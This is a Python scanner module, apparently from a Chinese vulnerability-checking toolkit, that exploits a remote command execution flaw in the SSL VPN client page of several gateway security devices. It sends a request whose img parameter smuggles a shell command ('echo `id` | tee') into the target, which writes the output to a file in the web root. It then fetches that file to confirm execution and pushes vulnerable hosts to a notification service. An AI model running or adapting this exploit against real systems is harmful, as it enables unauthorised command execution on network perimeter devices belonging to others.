# Multiple_gateway_security_devices_scan.py
# 121.多家网关-安全设备存在远程命令执行漏洞

import ServerJ
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os
import urllib.parse
import urllib.request

bugName="多家网关-安全设备存在远程命令执行漏洞"
def scan_Multiple_gateway_security_devices(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp%7Cecho%20%60id%60%20%7Ctee%20/usr/local/webui/sslvpn/859042264.txt"

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Connection": "close",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "macOS",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Language": 'zh-CN,zh-TW;q=0.9,zh;q=0.8',
    }

    target_url = url + path
    append_to_output("===================================================================", "green")
    append_to_output(f"扫描目标: {url}", "yellow")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req1 = requests.get(target_url, headers=headers, verify=False, timeout=20, proxies=proxies)

        if req1.status_code == 200 and '859042264' in req1.text:
            if url.endswith("/"):
                pathG = "sslvpn/859042264.txt"
            else:
                pathG = "/sslvpn/859042264.txt"

            if not url.startswith('http://') and not url.startswith('https://'):
                url = 'http://' + url

            target_urlG = url + pathG
            try:
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                req2 = requests.get(target_urlG, headers=headers, verify=False, timeout=20, proxies=proxies)
                if req2.status_code == 200 and 'uid' in req2.text:
                    append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
                    ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
                else:
                   append_to_output(f"[-] {url} 不存在{bugName}", "green")
            except requests.Timeout:
                append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
            except Exception as e:
                if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                    append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
                else:
                    append_to_output(str(e), "yellow")
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
    except requests.Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except requests.ConnectionError as conn_err:
        append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
